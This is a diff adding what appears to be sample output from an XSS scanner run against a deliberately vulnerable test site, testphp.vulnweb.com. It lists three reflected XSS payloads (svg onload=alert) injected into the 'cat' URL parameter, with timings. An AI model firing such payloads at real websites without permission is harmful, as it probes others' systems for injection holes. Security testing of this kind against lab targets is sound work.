@@ -1,0 +1,29 @@
+
+
+Developed By Abdul ( GitHub https://github.com/0xx7 )
+Enjoy hunting :)
+
+
+Doing pre-check of http://testphp.vulnweb.com/listproducts.php?cat=
+Page is reachable! Doing next pre-check...
+Http status code 200, we're good to go!
+
+
+Parameter used: cat
+Found xss in payload http://testphp.vulnweb.com/listproducts.php?cat=/"><svg onload=alert(34305489723146875555666)>
+Time elapsed for test: 0.46694254875183105 seconds
+XSS Type: Simple htmli
+
+
+Found xss in payload http://testphp.vulnweb.com/listproducts.php?cat=<svg onload=alert(34305489723146875555666)>
+Time elapsed for test: 0.30180931091308594 seconds
+XSS Type: inline htmli
+
+
+Found xss in payload http://testphp.vulnweb.com/listproducts.php?cat="><svg onload=alert(34305489723146875555666)>
+Time elapsed for test: 0.24342870712280273 seconds
+XSS Type: inblock htmli
+
+
+Number of xss found: 3
+Total time elapsed: 3.460653305053711 seconds
